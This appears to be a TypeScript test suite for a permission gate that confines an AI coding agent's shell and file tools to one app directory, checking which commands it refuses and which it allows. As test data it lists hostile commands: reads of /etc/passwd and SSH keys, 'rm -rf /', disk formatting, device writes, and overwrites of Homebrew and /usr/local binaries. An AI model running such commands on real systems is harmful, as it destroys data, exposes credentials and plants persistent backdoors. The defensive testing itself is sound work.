/**
 * Tests for the permission gate.
 *
 * This module is the only boundary between the model and the filesystem, and it had no
 * tests at all before the session that widened its shell scan. The cases below are
 * split deliberately: the ones that must keep refusing come first, because a widening
 * that quietly stops refusing `/etc/passwd` is a full escape, and the ones that must now
 * be allowed second.
 */

import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { describe, expect, test } from 'bun:test'
import {
  checkConfinement,
  checkPermission,
  describeNetworkUse,
  inspectCommand,
  isWithinRoot,
  resolveLikePi
} from './permission-gate'

/** A plausible sub-app root; nothing here touches the filesystem. */
const ROOT = '/Users/someone/.anyapp/apps/my-app'

describe('inspectCommand — still refuses', () => {
  const refused = [
    ['an absolute path outside the root', 'cat /etc/passwd'],
    ['a home-relative path', 'cat ~/.ssh/id_rsa'],
    ['a relative traversal', 'ls ../..'],
    ['a traversal mid-path', 'cat ../other-app/src/index.ts'],
    ['a sibling app root', 'cat /Users/someone/.anyapp/apps/other-app/x.ts'],
    ['a path that only shares a prefix with the root', `cat ${ROOT}-other/secret`]
  ] as const

  for (const [name, command] of refused) {
    test(`refuses ${name}`, () => {
      expect(inspectCommand(command, ROOT)).not.toBeNull()
    })
  }

  test('still refuses a write to a block device', () => {
    expect(inspectCommand('dd_like > /dev/disk0', ROOT)).toContain('/dev/disk0')
  })

  test('still refuses the blocklisted patterns', () => {
    expect(inspectCommand('sudo rm x', ROOT)).toContain('Blocked command pattern')
    expect(inspectCommand('rm -rf /', ROOT)).toContain('Blocked command pattern')
    expect(inspectCommand('mkfs.ext4 /dev/sda', ROOT)).toContain('Blocked command pattern')
  })

  const quoted = [
    ['a quoted absolute path', 'cat "/etc/passwd"'],
    ['a single-quoted absolute path', "cat '/etc/passwd'"],
    ['a quoted home path', 'cat "~/.ssh/id_rsa"'],
    ['a quoted device write', 'echo x > "/dev/disk0"'],
    ["a single-quoted device write", "echo x > '/dev/disk0'"]
  ] as const

  for (const [name, command] of quoted) {
    // `tokenizeCommand` cannot see inside quotes, so these were all allowed before
    // `quotedRootedPaths` and the redirect check's optional quotes.
    test(`refuses ${name}`, () => {
      expect(inspectCommand(command, ROOT)).not.toBeNull()
    })
  }

  const redirectForms = [
    'echo x >/dev/disk0',
    'echo x >> /dev/disk0',
    'echo x &> /dev/disk0',
    'echo x >| /dev/disk0',
    'echo x 1> /dev/disk0',
    'echo x 2> /dev/disk0',
    'echo x >\t/dev/disk0'
  ]

  for (const command of redirectForms) {
    test(`refuses the device write in ${JSON.stringify(command)}`, () => {
      expect(inspectCommand(command, ROOT)).not.toBeNull()
    })
  }

  test('says what to do instead, so the model can recover', () => {
    const reason = inspectCommand('cat /etc/passwd', ROOT)
    expect(reason).toContain('/etc/passwd')
    expect(reason).toContain('app directory')
  })
})

describe('inspectCommand — writable toolchain prefixes', () => {
  // `/usr/local` and `/opt/homebrew` may be *named*, because running a binary from them is
  // ordinary. They may not be *written to*: Apple excludes `/usr/local` from SIP and
  // `/opt/homebrew` is the Apple Silicon Homebrew prefix, so both are user-writable and
  // both sit on the PATH every other program on the machine uses. Overwriting a binary
  // there is a persistent backdoor outside the sub-app — something a bare command name
  // could never do, which is why the exemption's usual justification does not reach it.
  const writes = [
    'echo payload > /usr/local/bin/git',
    'echo payload > /opt/homebrew/bin/node',
    'echo payload >> /opt/homebrew/bin/node',
    'echo payload >| /opt/homebrew/bin/node',
    'echo payload > "/opt/homebrew/bin/node"',
    'cp evil.sh /opt/homebrew/bin/node',
    'mv evil /usr/local/bin/git',
    'cat x | tee /opt/homebrew/bin/node',
    'ln -sf evil /usr/local/bin/git',
    'rm /opt/homebrew/bin/node',
    'chmod +x /opt/homebrew/bin/node',
    'curl -o /opt/homebrew/bin/node http://x',
    'FOO=1 cp evil /usr/local/bin/git'
  ]

  for (const command of writes) {
    test(`refuses ${JSON.stringify(command)}`, () => {
      expect(inspectCommand(command, ROOT)).not.toBeNull()
    })
  }

  const runs = [
    '/opt/homebrew/bin/bun install',
    '/usr/local/bin/node --version',
    '/opt/homebrew/bin/bun run build 2>/dev/null'
  ]

  for (const command of runs) {
    // `install` here is a subcommand of `bun`, not the `install` command — the reason the
    // write test looks at command positions rather than every token.
    test(`allows ${JSON.stringify(command)}`, () => {
      expect(inspectCommand(command, ROOT)).toBeNull()
    })
  }

  test('does not extend the write rule to the app root or the temp dir', () => {
    expect(inspectCommand('cp src/a.ts src/b.ts', ROOT)).toBeNull()
    expect(inspectCommand(`cp src/a.ts ${join(tmpdir(), 'a.ts')}`, ROOT)).toBeNull()
  })
})

describe('inspectCommand — now allows', () => {
  const allowed = [
    ['stderr discarded without a space', 'bun run build 2>/dev/null'],
    ['stdout discarded with a space', 'bun run build > /dev/null'],
    ['both streams discarded', 'bun test > /dev/null 2>&1'],
    ['a device as an input', 'cat /dev/null'],
    ['an absolute interpreter path', '/usr/bin/env node src/index.ts'],
    ['a homebrew tool path', '/opt/homebrew/bin/bun install'],
    ['the OS temp directory', `bun build --outfile ${join(tmpdir(), 'out.js')}`],
    ['a plain relative command', 'bun run typecheck'],
    ['an in-root path', 'cat src/App.tsx']
  ] as const

  for (const [name, command] of allowed) {
    test(`allows ${name}`, () => {
      expect(inspectCommand(command, ROOT)).toBeNull()
    })
  }

  test('leaves a quoted traversal alone — it is usually a pattern, not a path', () => {
    // The counterpart to the quoted-absolute-path case above. Refusing this would be the
    // same class of false refusal as refusing `2>/dev/null`.
    expect(inspectCommand('grep "\\.\\./" src', ROOT)).toBeNull()
    expect(inspectCommand("grep '../x' src", ROOT)).toBeNull()
  })

  test('does not accept a path that merely starts like a safe one', () => {
    expect(inspectCommand('cat /usr/binaries/secret', ROOT)).not.toBeNull()
    expect(inspectCommand('cat /tmpfoo/secret', ROOT)).not.toBeNull()
  })
})

describe('checkConfinement', () => {
  test('confines every path-bearing tool, replace_lines included', () => {
    for (const toolName of ['read', 'write', 'edit', 'replace_lines', 'grep', 'find', 'ls']) {
      expect(checkConfinement({ toolName, input: { path: '/etc/passwd' } }, ROOT)).not.toBeNull()
      expect(checkConfinement({ toolName, input: { path: 'src/App.tsx' } }, ROOT)).toBeNull()
    }
  })

  test('treats an absent path as the working directory', () => {
    expect(checkConfinement({ toolName: 'ls', input: {} }, ROOT)).toBeNull()
  })

  test('rejects a non-string path rather than coercing it', () => {
    expect(checkConfinement({ toolName: 'read', input: { path: 42 } }, ROOT)).toBe('Invalid path')
  })

  test('validates a fetch URL without applying a host policy', () => {
    expect(checkConfinement({ toolName: 'web_fetch', input: { url: 'http://localhost:1' } }, ROOT)).toBeNull()
    expect(checkConfinement({ toolName: 'web_fetch', input: { url: 'file:///etc/passwd' } }, ROOT)).not.toBeNull()
    expect(checkConfinement({ toolName: 'web_fetch', input: { url: 'not a url' } }, ROOT)).not.toBeNull()
  })

  test('routes bash through the command scan', () => {
    expect(checkConfinement({ toolName: 'bash', input: { command: 'ls ../..' } }, ROOT)).not.toBeNull()
    expect(checkConfinement({ toolName: 'bash', input: { command: 'ls src' } }, ROOT)).toBeNull()
    expect(checkConfinement({ toolName: 'bash', input: {} }, ROOT)).toBe('Missing command')
  })
})

describe('checkPermission', () => {
  test('plan allows the tools that only inspect', () => {
    for (const tool of [
      'read',
      'grep',
      'find',
      'ls',
      'load_skill',
      'git_status',
      'get_history',
      'list_branches',
      'web_fetch'
    ]) {
      expect(checkPermission('plan', tool).behavior).toBe('allow')
    }
  })

  test('plan denies anything that can change the app or the machine', () => {
    // `create_branch`, `switch_branch` and `rollback` move HEAD, which is a change even
    // though nothing is written. `bash` is not a read tool however read-only it looks.
    for (const tool of [
      'write',
      'edit',
      'replace_lines',
      'bash',
      'install_deps',
      'create_branch',
      'switch_branch',
      'rollback'
    ]) {
      expect(checkPermission('plan', tool).behavior).toBe('deny')
    }
  })

  test('plan denies MCP tools, which act in a process anyapp does not control', () => {
    expect(checkPermission('plan', 'mcp__github__create_issue').behavior).toBe('deny')
  })

  test('plan denies an unknown tool, so a new one cannot inherit read access', () => {
    expect(checkPermission('plan', 'some_future_tool').behavior).toBe('deny')
  })

  test('default prompts for every tool, web_fetch included', () => {
    expect(checkPermission('default', 'read').behavior).toBe('ask')
    expect(checkPermission('default', 'web_fetch').behavior).toBe('ask')
  })

  test('acceptEdits auto-approves file and version tools', () => {
    expect(checkPermission('acceptEdits', 'edit').behavior).toBe('allow')
    expect(checkPermission('acceptEdits', 'replace_lines').behavior).toBe('allow')
    expect(checkPermission('acceptEdits', 'git_status').behavior).toBe('allow')
  })

  test('acceptEdits never auto-approves a subprocess', () => {
    expect(checkPermission('acceptEdits', 'bash').behavior).toBe('ask')
    expect(checkPermission('acceptEdits', 'install_deps').behavior).toBe('ask')
  })

  test('an unclassified tool falls through to ask, never allow', () => {
    expect(checkPermission('acceptEdits', 'some_future_tool').behavior).toBe('ask')
    expect(checkPermission('default', 'some_future_tool').behavior).toBe('ask')
  })

  test('MCP tools always reach the user outside bypassPermissions', () => {
    expect(checkPermission('acceptEdits', 'mcp__notion__search').behavior).toBe('ask')
    expect(checkPermission('bypassPermissions', 'mcp__notion__search').behavior).toBe('allow')
  })
})

describe('resolveLikePi and isWithinRoot', () => {
  test('expands a leading tilde the way Pi does', () => {
    expect(resolveLikePi('~/x', ROOT).startsWith('/')).toBe(true)
    expect(isWithinRoot(ROOT, resolveLikePi('~/x', ROOT))).toBe(false)
  })

  test('strips a leading @', () => {
    expect(resolveLikePi('@src/App.tsx', ROOT)).toBe(`${ROOT}/src/App.tsx`)
  })

  test('compares path segments, not string prefixes', () => {
    expect(isWithinRoot(ROOT, `${ROOT}-other/x`)).toBe(false)
    expect(isWithinRoot(ROOT, `${ROOT}/x`)).toBe(true)
    expect(isWithinRoot(ROOT, ROOT)).toBe(true)
  })
})

describe('describeNetworkUse', () => {
  test('spots a network command without refusing it', () => {
    expect(describeNetworkUse('curl https://example.com')).toContain('curl')
    expect(describeNetworkUse('git push origin main')).toContain('git push')
    expect(describeNetworkUse('bun install')).toContain('bun install')
  })

  test('does not read a path as a command', () => {
    expect(describeNetworkUse('cat src/curly/x.ts')).toBeNull()
  })
})
